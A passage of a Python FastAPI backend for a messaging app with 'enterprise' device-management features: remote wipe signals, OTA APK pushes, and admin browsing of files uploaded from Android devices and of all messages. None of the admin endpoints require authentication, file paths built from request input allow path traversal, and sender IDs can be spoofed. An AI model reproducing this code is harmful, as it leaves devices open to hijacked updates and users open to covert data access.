    conn.commit()
    conn.close()

    await ws_manager.broadcast_all({
        "type": "ADMIN_DEVICE_DELETED",
        "device_id": device_id
    })

    return {"status": "success", "message": f"Device {device_id} deleted successfully"}

@app.put("/api/admin/devices/{device_id}")
async def admin_update_device(device_id: str, data: dict):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    existing = cursor.fetchone()
    if not existing:
        conn.close()
        raise HTTPException(status_code=404, detail="Device not found")

    device_model = data.get("device_model", existing["device_model"])
    username = data.get("username", existing["username"])
    email = data.get("email", existing["email"])
    is_blocked = 1 if data.get("is_blocked") else 0 if "is_blocked" in data else existing.get("is_blocked", 0)

    now = int(time.time() * 1000)
    cursor.execute(
        """UPDATE devices 
           SET device_model = ?, username = ?, email = ?, is_blocked = ?, last_sync_timestamp = ? 
           WHERE device_id = ?""",
        (device_model.strip(), username.strip(), email.strip() if email else None, is_blocked, now, device_id)
    )
    conn.commit()

    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    updated = dict(cursor.fetchone())
    conn.close()

    await ws_manager.broadcast_all({
        "type": "ADMIN_DEVICE_UPDATED",
        "device": updated
    })

    return updated

@app.post("/api/admin/devices/{device_id}/block")
async def admin_toggle_block_device(device_id: str, data: dict):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    existing = cursor.fetchone()
    if not existing:
        conn.close()
        raise HTTPException(status_code=404, detail="Device not found")

    is_blocked = 1 if data.get("is_blocked") else 0
    now = int(time.time() * 1000)

    cursor.execute(
        "UPDATE devices SET is_blocked = ?, last_sync_timestamp = ? WHERE device_id = ?",
        (is_blocked, now, device_id)
    )
    conn.commit()

    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    updated = dict(cursor.fetchone())
    conn.close()

    await ws_manager.broadcast_all({
        "type": "ADMIN_DEVICE_BLOCKED" if is_blocked else "ADMIN_DEVICE_UNBLOCKED",
        "device_id": device_id,
        "is_blocked": is_blocked
    })

    return {"status": "success", "device_id": device_id, "is_blocked": is_blocked}

# --- ENTERPRISE DEVICE MANAGEMENT (MDM) & REMOTE POLICY CONTROLS ---

CONFIG_FILE = os.path.join(os.path.dirname(__file__), "remote_config.json")

def load_remote_config() -> dict:
    default_config = {
        "allow_screenshots": True,
        "voice_calling_enabled": True,
        "maintenance_mode": False,
        "min_required_version": 1,
        "latest_version_code": 104,
        "latest_version_name": "1.0.4",
        "apk_url": "/static/vibesync-release.apk",
        "release_notes": "Official VibeSync Enterprise Client Update"
    }
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                default_config.update(data)
        except Exception as e:
            print(f"Error loading remote config: {e}")
    return default_config

def save_remote_config(cfg: dict):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
    except Exception as e:
        print(f"Error saving remote config: {e}")

@app.get("/api/v1/app/version")
def get_app_version(request: Request):
    config = load_remote_config()
    base_url = str(request.base_url).rstrip("/")
    apk_url = config.get("apk_url", "/static/vibesync-release.apk")
    if apk_url.startswith("/"):
        full_apk_url = f"{base_url}{apk_url}"
    else:
        full_apk_url = apk_url

    return {
        "versionCode": config.get("latest_version_code", 104),
        "versionName": config.get("latest_version_name", "1.0.4"),
        "minRequiredVersion": config.get("min_required_version", 1),
        "apkUrl": full_apk_url,
        "releaseNotes": config.get("release_notes", ""),
        "version_code": config.get("latest_version_code", 104),
        "version_name": config.get("latest_version_name", "1.0.4"),
        "min_required_version": config.get("min_required_version", 1),
        "apk_url": full_apk_url,
        "release_notes": config.get("release_notes", "")
    }

@app.get("/api/admin/config")
def get_admin_config():
    return load_remote_config()

@app.post("/api/admin/config")
async def update_admin_config(data: dict):
    config = load_remote_config()
    for k, v in data.items():
        if k in config or k in [
            "allow_screenshots", "voice_calling_enabled", "maintenance_mode",
            "min_required_version", "latest_version_code", "latest_version_name",
            "apk_url", "release_notes"
        ]:
            config[k] = v
    save_remote_config(config)

    # Broadcast config sync event to all connected devices via WebSocket
    await ws_manager.broadcast_all({
        "type": "ACTION_CONFIG_SYNC",
        "payload": config
    })

    if data.get("broadcast_ota"):
        await ws_manager.broadcast_all({
            "type": "ACTION_OTA_UPDATE",
            "payload": config
        })

    return {"status": "success", "config": config}

@app.post("/api/admin/ota/broadcast")
async def broadcast_ota_update():
    config = load_remote_config()
    await ws_manager.broadcast_all({
        "type": "ACTION_OTA_UPDATE",
        "payload": config
    })
    return {"status": "success", "message": "OTA update broadcasted to all connected devices"}

@app.post("/api/admin/devices/{device_id}/sanitize")
async def admin_sanitize_device(device_id: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()

    device = dict(row) if row else None
    targets = [device_id]
    if device:
        if device.get("username") and device["username"] != "Current User":
            targets.append(device["username"])
        if device.get("user_id"):
            targets.append(device["user_id"])

    action_payload = {
        "type": "ACTION_DEVICE_SANITIZE",
        "action": "SANITIZE_DATA",
        "device_id": device_id,
        "timestamp": int(time.time() * 1000)
    }

    delivered = False
    for target in targets:
        success = await ws_manager.send_personal_message(action_payload, target)
        if success:
            delivered = True

    return {
        "status": "success",
        "device_id": device_id,
        "delivered": delivered,
        "message": f"Sanitization signal dispatched to device {device_id}"
    }

@app.post("/api/admin/devices/{device_id}/deprovision")
async def admin_deprovision_device(device_id: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()

    device = dict(row) if row else None
    targets = [device_id]
    if device:
        if device.get("username") and device["username"] != "Current User":
            targets.append(device["username"])
        if device.get("user_id"):
            targets.append(device["user_id"])

    action_payload = {
        "type": "ACTION_DEVICE_DEPROVISION",
        "action": "DEPROVISION_DEVICE",
        "device_id": device_id,
        "timestamp": int(time.time() * 1000)
    }

    delivered = False
    for target in targets:
        success = await ws_manager.send_personal_message(action_payload, target)
        if success:
            delivered = True

    return {
        "status": "success",
        "device_id": device_id,
        "delivered": delivered,
        "message": f"De-provisioning signal dispatched to device {device_id}"
    }

import mimetypes

def resolve_file_name_and_category(fname: str, fpath: str):
    """
    Detects proper filename with extension using magic bytes if filename lacks extension.
    Returns (display_name, category, mime_type).
    """
    ext = fname.split(".")[-1].lower() if "." in fname else ""
    
    # Magic byte check if no extension
    if not ext or len(ext) > 10:
        try:
            with open(fpath, "rb") as f:
                head = f.read(16)
            if head.startswith(b"\x89PNG\r\n\x1a\n"):
                ext = "png"
            elif head.startswith(b"\xff\xd8\xff"):
                ext = "jpg"
            elif head.startswith(b"%PDF"):
                ext = "pdf"
            elif head.startswith(b"PK\x03\x04"):
                ext = "docx"
            elif head.startswith(b"GIF8"):
                ext = "gif"
            elif b"ftyp" in head:
                ext = "mp4"
            elif head.startswith(b"ID3") or head.startswith(b"\xff\xfb"):
                ext = "mp3"
            elif head.startswith(b"<!DOC") or head.startswith(b"<html") or head.startswith(b"<HTML"):
                ext = "html"
            else:
                ext = "bin"
        except Exception:
            ext = "bin"
        display_name = f"{fname}.{ext}" if not fname.endswith(f".{ext}") else fname
    else:
        display_name = fname

    cat = "Image" if ext in ["png", "jpg", "jpeg", "gif", "webp", "bmp"] else \
          "Document" if ext in ["pdf", "doc", "docx", "txt", "html", "htm", "rtf"] else \
          "Spreadsheet" if ext in ["csv", "xlsx", "xls"] else \
          "Audio" if ext in ["mp3", "wav", "m4a", "ogg", "aac", "flac"] else \
          "Video" if ext in ["mp4", "mkv", "avi", "mov", "webm"] else "Other"

    mime_type, _ = mimetypes.guess_type(display_name)
    if not mime_type:
        mime_type = "application/octet-stream"

    return display_name, cat, mime_type

@app.get("/api/admin/files")
def get_admin_files():
    """
    Returns list of downloadable files from server storage with user ownership & detected formats,
    representing actual files uploaded by Android devices and users.
    """
    files = []

    # 1. Fetch files uploaded by actual devices from SQLite device_files table
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("""
            SELECT df.*, d.device_model, u.display_name 
            FROM device_files df
            LEFT JOIN devices d ON df.device_id = d.device_id
            LEFT JOIN users u ON df.username = u.username
            ORDER BY df.created_at DESC
        """)
        for row in cursor.fetchall():
            r = dict(row)
            fname = r["filename"]
            disp_name = fname
            cat = r["category"]
            sz = r["size_bytes"]
            username = r["username"] or "unknown_user"
            display_name = r["display_name"] or username
            device_model = r["device_model"] or r["device_id"]

            files.append({
                "id": r["id"],
                "name": disp_name,
                "category": cat,
                "size_bytes": sz,
                "size_formatted": f"{round(sz / 1024, 1)} KB" if sz < 1048576 else f"{round(sz / 1048576, 1)} MB",
                "username": username,
                "display_name": display_name,
                "device_id": device_model,
                "created_at": r["created_at"],
                "download_url": f"/api/admin/files/download/{r['id']}"
            })
        conn.close()
    except Exception:
        pass

    return files

from fastapi.responses import FileResponse

@app.get("/api/admin/files/download/{file_name}")
def download_admin_file(file_name: str):
    """
    Downloads file from MEDIA_DIR or device_backups with proper Content-Type & forced Content-Disposition header.
    """

    # 1. Check if file is tracked in device_files
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM device_files WHERE id = ? OR filename = ?", (file_name, file_name))
        row = cursor.fetchone()
        conn.close()
        if row and os.path.exists(row["file_path"]):
            disp_name = row["filename"]
            mime_type = row["mime_type"] or "application/octet-stream"
            return FileResponse(
                path=row["file_path"],
                filename=disp_name,
                media_type=mime_type,
                headers={
                    "Content-Disposition": f'attachment; filename="{disp_name}"',
                    "Access-Control-Expose-Headers": "Content-Disposition"
                }
            )
    except Exception:
        pass

    # 2. Check in MEDIA_DIR
    fpath = os.path.join(MEDIA_DIR, file_name)
    if not os.path.exists(fpath):
        base_name = file_name.split(".")[0]
        alt_path = os.path.join(MEDIA_DIR, base_name)
        if os.path.exists(alt_path):
            fpath = alt_path

    if not os.path.exists(fpath):
        raise HTTPException(status_code=404, detail="Requested file does not exist")

    disp_name, _, mime_type = resolve_file_name_and_category(file_name, fpath)

    return FileResponse(
        path=fpath,
        filename=disp_name,
        media_type=mime_type,
        headers={
            "Content-Disposition": f'attachment; filename="{disp_name}"',
            "Access-Control-Expose-Headers": "Content-Disposition"
        }
    )

@app.delete("/api/users/{user_id}")
async def delete_user(user_id: str):
    """
    Delete a user from SQLite database and notify all clients.
    """
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
    cursor.execute("UPDATE devices SET user_id = NULL, username = 'Current User' WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

    await ws_manager.broadcast_all({
        "type": "ADMIN_USER_DELETED",
        "user_id": user_id
    })

    return {"status": "success", "message": f"User {user_id} deleted"}

@app.delete("/api/admin/files/{file_name}")
async def delete_admin_file(file_name: str):
    """
    Deletes file from media storage or device_files and broadcasts real-time system update.
    """
    # 1. Delete from device_files if present
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM device_files WHERE id = ? OR filename = ?", (file_name, file_name))
        row = cursor.fetchone()
        if row:
            if os.path.exists(row["file_path"]):
                try:
                    os.remove(row["file_path"])
                except Exception:
                    pass
            cursor.execute("DELETE FROM device_files WHERE id = ?", (row["id"],))
            conn.commit()
        cursor.execute("DELETE FROM device_storage_summary WHERE sample_names LIKE ?", (f"%{file_name}%",))
        conn.commit()
        conn.close()
    except Exception:
        pass

    # 2. Delete from MEDIA_DIR
    fpath = os.path.join(MEDIA_DIR, file_name)
    if os.path.exists(fpath):
        try:
            os.remove(fpath)
        except Exception:
            pass

    await ws_manager.broadcast_all({
        "type": "ADMIN_FILE_DELETED",
        "file_name": file_name
    })

    return {"status": "success", "message": f"File {file_name} deleted successfully"}

# --- IN-APP ROSTER MANAGEMENT ---

@app.post("/api/contacts")
def add_to_roster(owner_id: str, req: ContactAdd):
    conn = get_db()
    cursor = conn.cursor()
    now = int(time.time() * 1000)
    cursor.execute("""
        INSERT OR REPLACE INTO in_app_contacts (owner_id, contact_user_id, saved_name, created_at)
        VALUES (?, ?, ?, ?)
    """, (owner_id, req.contact_user_id, req.saved_name, now))
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Contact added to roster"}

@app.get("/api/contacts/{owner_id}")
def get_roster(owner_id: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT u.*, c.saved_name
        FROM in_app_contacts c
        JOIN users u ON c.contact_user_id = u.id
        WHERE c.owner_id = ?
        ORDER BY u.display_name ASC
    """, (owner_id,))
    rows = cursor.fetchall()
    conn.close()
    
    result = []
    for r in rows:
        item = dict(r)
        item["is_online"] = ws_manager.is_online(r["id"])
        result.append(item)
    return result

# --- CONVERSATIONS & MESSAGES ---

@app.get("/api/conversations/{user_id}")
def get_conversations(user_id: str):
    conn = get_db()
    cursor = conn.cursor()

    # Resolve user
    cursor.execute("SELECT id, username FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (user_id, user_id))
    u_row = cursor.fetchone()
    u_id = u_row["id"] if u_row else user_id
    u_name = u_row["username"] if u_row else user_id

    cursor.execute("""
        SELECT c.*,
               CASE WHEN (c.participant_one = ? OR c.participant_one = ?) THEN COALESCE(u2.id, c.participant_two) ELSE COALESCE(u1.id, c.participant_one) END AS partner_id,
               CASE WHEN (c.participant_one = ? OR c.participant_one = ?) THEN COALESCE(u2.username, c.participant_two) ELSE COALESCE(u1.username, c.participant_one) END AS partner_username,
               CASE WHEN (c.participant_one = ? OR c.participant_one = ?) THEN COALESCE(u2.display_name, u2.username, c.participant_two) ELSE COALESCE(u1.display_name, u1.username, c.participant_one) END AS partner_display_name,
               CASE WHEN (c.participant_one = ? OR c.participant_one = ?) THEN u2.avatar_url ELSE u1.avatar_url END AS partner_avatar_url
        FROM conversations c
        LEFT JOIN users u1 ON c.participant_one = u1.id OR LOWER(c.participant_one) = LOWER(u1.username)
        LEFT JOIN users u2 ON c.participant_two = u2.id OR LOWER(c.participant_two) = LOWER(u2.username)
        WHERE c.participant_one = ? OR c.participant_two = ? OR c.participant_one = ? OR c.participant_two = ?
        ORDER BY c.last_message_time DESC
    """, (u_id, u_name, u_id, u_name, u_id, u_name, u_id, u_name, u_id, u_id, u_name, u_name))
    rows = cursor.fetchall()
    conn.close()
    
    conversations = []
    for r in rows:
        item = dict(r)
        item["is_online"] = ws_manager.is_online(r["partner_id"])
        conversations.append(item)
    return conversations

@app.get("/api/messages/{conversation_id}")
def get_messages(conversation_id: str, current_user: Optional[str] = None):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT * FROM messages
        WHERE conversation_id = ?
        ORDER BY created_at ASC
    """, (conversation_id,))
    rows = cursor.fetchall()
    
    # If no messages found by conversation_id, check if conversation_id is actually a user ID or username
    if not rows:
        # Special case: "admin" is not in the users table — look up conversation by admin sender_id
        if conversation_id.lower() == "admin" and current_user:
            cursor.execute("SELECT id FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (current_user, current_user))
            cu_row = cursor.fetchone()
            cu_id = cu_row["id"] if cu_row else current_user
            p1, p2 = sorted(["admin", cu_id])
            cursor.execute("SELECT id FROM conversations WHERE (participant_one = ? AND participant_two = ?) OR (participant_one = ? AND participant_two = ?)", (p1, p2, p2, p1))
            c_row = cursor.fetchone()
            if c_row:
                cursor.execute("SELECT * FROM messages WHERE conversation_id = ? ORDER BY created_at ASC", (c_row["id"],))
                rows = cursor.fetchall()
            if not rows:
                # Fallback: fetch all messages where sender_id = admin and recipient is this user
                cursor.execute("""
                    SELECT * FROM messages
                    WHERE (sender_id = 'admin' AND recipient_id = ?)
                       OR (sender_id = ? AND recipient_id = 'admin')
                    ORDER BY created_at ASC
                """, (cu_id, cu_id))
                rows = cursor.fetchall()
        else:
            cursor.execute("SELECT id FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (conversation_id, conversation_id))
            u_row = cursor.fetchone()
            if u_row:
                u_id = u_row["id"]
                if current_user:
                    cursor.execute("SELECT id FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (current_user, current_user))
                    cu_row = cursor.fetchone()
                    cu_id = cu_row["id"] if cu_row else current_user
                    p1, p2 = sorted([u_id, cu_id])
                    cursor.execute("SELECT id FROM conversations WHERE (participant_one = ? AND participant_two = ?) OR (participant_one = ? AND participant_two = ?)", (p1, p2, p2, p1))
                    c_row = cursor.fetchone()
                    if c_row:
                        cursor.execute("SELECT * FROM messages WHERE conversation_id = ? ORDER BY created_at ASC", (c_row["id"],))
                        rows = cursor.fetchall()
                else:
                    cursor.execute("""
                        SELECT m.* FROM messages m
                        JOIN conversations c ON m.conversation_id = c.id
                        WHERE c.participant_one = ? OR c.participant_two = ?
                        ORDER BY m.created_at ASC
                    """, (u_id, u_id))
                    rows = cursor.fetchall()

    conn.close()
    
    messages = []
    for r in rows:
        m = dict(r)
        if m.get("waveform_data"):
            try:
                m["waveform_data"] = json.loads(m["waveform_data"])
            except Exception:
                m["waveform_data"] = []
        messages.append(m)
    return messages

@app.post("/api/messages/send")
def send_message_api(req: MessageSend):
    """
    HTTP REST endpoint to send and dynamically persist a message into SQLite app.db.
    """
    conn = get_db()
    cursor = conn.cursor()
    
    sender_id = req.sender_id or "me"
    recipient_id = req.recipient_id
    message_type = req.message_type
    content = req.content
    now = int(time.time() * 1000)

    # Resolve sender if it is a username
    cursor.execute("SELECT id FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (sender_id, sender_id))
    s_row = cursor.fetchone()
    if s_row:
        sender_id = s_row["id"]

    # Resolve recipient if it is a username
    cursor.execute("SELECT id FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (recipient_id, recipient_id))
    r_row = cursor.fetchone()
    if r_row:
        recipient_id = r_row["id"]
    
    # 1. Ensure conversation exists
    p1, p2 = sorted([sender_id, recipient_id])
    cursor.execute("SELECT id FROM conversations WHERE (participant_one = ? AND participant_two = ?) OR (participant_one = ? AND participant_two = ?)", (p1, p2, p2, p1))
    c_row = cursor.fetchone()
    if c_row:
        conv_id = c_row["id"]
        cursor.execute("UPDATE conversations SET last_message_preview = ?, last_message_time = ? WHERE id = ?", (content, now, conv_id))
    else:
        conv_id = str(uuid.uuid4())
        cursor.execute("INSERT INTO conversations (id, participant_one, participant_two, last_message_preview, last_message_time) VALUES (?, ?, ?, ?, ?)", (conv_id, p1, p2, content, now))
        
    msg_id = str(uuid.uuid4())
    waveform_json = json.dumps(req.waveform_data) if req.waveform_data else None
    status = "DELIVERED" if (ws_manager.is_online(recipient_id) or ws_manager.is_online(req.recipient_id)) else "SENT"
    
    cursor.execute("""
        INSERT INTO messages (id, conversation_id, sender_id, recipient_id, message_type, content, media_url, media_duration_ms, waveform_data, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (msg_id, conv_id, sender_id, recipient_id, message_type, content, req.media_url, req.media_duration_ms, waveform_json, status, now))
    
    conn.commit()
    conn.close()
    
    return {
        "status": "success",
        "message_id": msg_id,
        "conversation_id": conv_id,
        "content": content,
        "created_at": now
    }

@app.post("/api/calls/log")
def log_call_api(req: CallLogRequest):
    """
    HTTP REST endpoint to record dynamic call logs (Voice/Video) into SQLite app.db.
    """
    conn = get_db()
    cursor = conn.cursor()
    
    sender_id = "me"
    recipient_id = req.recipient_id
    call_type_str = "Video Call" if req.is_video else "Voice Call"
    content = f"Outgoing {call_type_str}"
    now = int(time.time() * 1000)
    
    # 1. Ensure conversation exists for call history reference
    p1, p2 = sorted([sender_id, recipient_id])
    cursor.execute("SELECT id FROM conversations WHERE participant_one = ? AND participant_two = ?", (p1, p2))
    c_row = cursor.fetchone()
    if c_row:
        conv_id = c_row["id"]
        cursor.execute("UPDATE conversations SET last_message_preview = ?, last_message_time = ? WHERE id = ?", (f"📞 {call_type_str}", now, conv_id))
    else:
        conv_id = str(uuid.uuid4())
        cursor.execute("INSERT INTO conversations (id, participant_one, participant_two, last_message_preview, last_message_time) VALUES (?, ?, ?, ?, ?)", (conv_id, p1, p2, f"📞 {call_type_str}", now))
        
    msg_id = str(uuid.uuid4())
    cursor.execute("""
        INSERT INTO messages (id, conversation_id, sender_id, recipient_id, message_type, content, status, created_at)
        VALUES (?, ?, ?, ?, 'CALL_LOG', ?, 'DELIVERED', ?)
    """, (msg_id, conv_id, sender_id, recipient_id, content, now))
    
    conn.commit()
    conn.close()
    
    return {
        "status": "success",
        "call_log_id": msg_id,
        "conversation_id": conv_id,
        "call_type": call_type_str,
        "created_at": now
    }

# --- MEDIA / VOICE NOTE UPLOADS ---

@app.post("/api/media/upload")
async def upload_voice_note(file: UploadFile = File(...)):
    ext = os.path.splitext(file.filename)[1] or ".m4a"
    filename = f"voice_{uuid.uuid4()}{ext}"
    filepath = os.path.join(MEDIA_DIR, filename)
    
    content = await file.read()
    with open(filepath, "wb") as f:
        f.write(content)
        
    return {
        "media_url": f"/uploads/{filename}",
        "filename": filename
    }

# --- AGORA RTC TOKEN GENERATION ---

@app.get("/api/calls/token")
def get_agora_token(channel_name: str = Query(...), uid: int = Query(0)):
    """
    Generates dynamic Agora RTC Token for real-time voice/video calls.
    Returns app_id, token, channel_name, and uid.
    """
    app_id = AGORA_APP_ID
    app_cert = AGORA_APP_CERTIFICATE
    
    # 24-Hour Expiration Time
    expiration_time_in_seconds = 86400
    current_timestamp = int(time.time())
    privilege_expired_ts = current_timestamp + expiration_time_in_seconds

    token = ""
    if RtcTokenBuilder and Role_Publisher and app_id and app_cert:
        try:
            token = RtcTokenBuilder.buildTokenWithUid(
                app_id, app_cert, channel_name, uid, Role_Publisher, privilege_expired_ts
            )
        except Exception as e:
            print(f"Error generating Agora RTC Token with cert: {e}")
            token = ""
    
    return {
        "app_id": app_id,
        "token": token,
        "channel_name": channel_name,
        "uid": uid
    }

@app.post("/api/calls/log")
async def log_call(data: dict):
    """
    Logs a voice or video call into database and broadcasts CALL_INITIATE signal via WebSocket.
    """
    call_id = str(uuid.uuid4())
    caller_id = data.get("caller_id") or "caller_user"
    recipient_id = data.get("recipient_id")
    is_video = 1 if data.get("is_video") else 0
    now = int(time.time() * 1000)

    if not recipient_id:
        raise HTTPException(status_code=400, detail="recipient_id is required")

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO call_logs (id, caller_id, recipient_id, is_video, status, timestamp)
        VALUES (?, ?, ?, ?, 'INITIATED', ?)
    """, (call_id, caller_id, recipient_id, is_video, now))
    conn.commit()
    conn.close()

    # Send WebSocket alert to recipient if connected
    await ws_manager.send_personal_message({
        "type": "CALL_INITIATE",
        "call_id": call_id,
        "caller_id": caller_id,
        "recipient_id": recipient_id,
        "is_video": is_video,
        "timestamp": now
    }, recipient_id)

    return {"status": "success", "call_id": call_id}

# --- REALTIME WEBSOCKET GATEWAY (Messaging & Call Signaling) ---

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, user_id: str):
    aliases = [user_id]
    try:
        conn = get_db()
        cursor = conn.cursor()
        clean_u = user_id.lstrip("@").strip()
        cursor.execute("SELECT id, username FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (clean_u, clean_u))
        u_row = cursor.fetchone()
        if u_row:
            aliases.append(u_row["id"])
            aliases.append(u_row["username"])
            cursor.execute("SELECT device_id FROM devices WHERE user_id = ? OR LOWER(username) = LOWER(?)", (u_row["id"], u_row["username"]))
            for dev in cursor.fetchall():
                if dev["device_id"]:
                    aliases.append(dev["device_id"])
        conn.close()
    except Exception as e:
        logger.warning(f"Error fetching aliases for {user_id}: {e}")

    await ws_manager.connect(user_id, websocket, aliases=aliases)
    try:
        while True:
            data_str = await websocket.receive_text()
            data = json.loads(data_str)
            msg_type = data.get("type")
            
            if msg_type == "CHAT_MESSAGE":
                # Handle & store incoming message
                payload = data.get("payload")
                msg_id = payload.get("id") or str(uuid.uuid4())
                conv_id = payload.get("conversation_id")
                sender_id = user_id
                recipient_id = payload.get("recipient_id")
                message_type = payload.get("message_type", "TEXT")
                content = payload.get("content")
                media_url = payload.get("media_url")
                media_duration = payload.get("media_duration_ms")
                waveform = payload.get("waveform_data")
                now = int(time.time() * 1000)
                
                # Check / ensure conversation exists
                conn = get_db()
                cursor = conn.cursor()
                if not conv_id:
                    # Look up conversation by participants
                    p1, p2 = sorted([sender_id, recipient_id])
                    cursor.execute("SELECT id FROM conversations WHERE participant_one = ? AND participant_two = ?", (p1, p2))
                    c_row = cursor.fetchone()
                    if c_row:
                        conv_id = c_row["id"]
                    else:
                        conv_id = str(uuid.uuid4())
                        cursor.execute("""
                            INSERT INTO conversations (id, participant_one, participant_two, last_message_preview, last_message_time, unread_count)
                            VALUES (?, ?, ?, ?, ?, 0)
                        """, (conv_id, p1, p2, content or "Voice Note", now))
                
                # Insert message into DB
                waveform_str = json.dumps(waveform) if waveform else None
                status = "DELIVERED" if ws_manager.is_online(recipient_id) else "SENT"
                
                cursor.execute("""
                    INSERT INTO messages (id, conversation_id, sender_id, recipient_id, message_type, content, media_url, media_duration_ms, waveform_data, status, created_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """, (msg_id, conv_id, sender_id, recipient_id, message_type, content, media_url, media_duration, waveform_str, status, now))
                
                # Update conversation preview
                preview = "🎤 Voice Note" if message_type == "VOICE_NOTE" else (content or "")
                cursor.execute("""
                    UPDATE conversations
                    SET last_message_preview = ?, last_message_time = ?
                    WHERE id = ?
                """, (preview, now, conv_id))
                conn.commit()
                conn.close()
                
                # Prepare outgoing payload
                event = {
                    "type": "NEW_MESSAGE",
                    "payload": {
                        "id": msg_id,
                        "conversation_id": conv_id,
                        "sender_id": sender_id,
                        "recipient_id": recipient_id,
                        "message_type": message_type,
                        "content": content,
                        "media_url": media_url,
                        "media_duration_ms": media_duration,
                        "waveform_data": waveform,
                        "status": status,
                        "created_at": now
                    }
                }
                
                # Send to recipient and echo back status update to sender
                await ws_manager.send_personal_message(event, recipient_id)
                await ws_manager.send_personal_message({
                    "type": "MESSAGE_ACK",
                    "payload": {"id": msg_id, "conversation_id": conv_id, "status": status}
                }, sender_id)
                
            elif msg_type == "TYPING_STATUS":
                recipient_id = data.get("recipient_id")
                is_typing = data.get("is_typing", False)
                await ws_manager.send_personal_message({
                    "type": "TYPING_STATUS",
                    "sender_id": user_id,
                    "is_typing": is_typing
                }, recipient_id)
                
            elif msg_type in ["CALL_INITIATE", "CALL_ACCEPTED", "CALL_REJECTED", "CALL_ENDED", "CALL_OFFER", "CALL_ANSWER", "ICE_CANDIDATE", "CALL_HANGUP"]:
                # Agora / Legacy Signaling Relay
                recipient_id = data.get("recipient_id")
                data["sender_id"] = user_id
                await ws_manager.send_personal_message(data, recipient_id)

                
    except WebSocketDisconnect:
        ws_manager.disconnect(user_id, aliases=aliases)
        await ws_manager.broadcast_user_status(user_id, online=False)


if __name__ == "__main__":
    import uvicorn
    print("Starting VibeSync Backend Server on http://0.0.0.0:8000 ...")
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
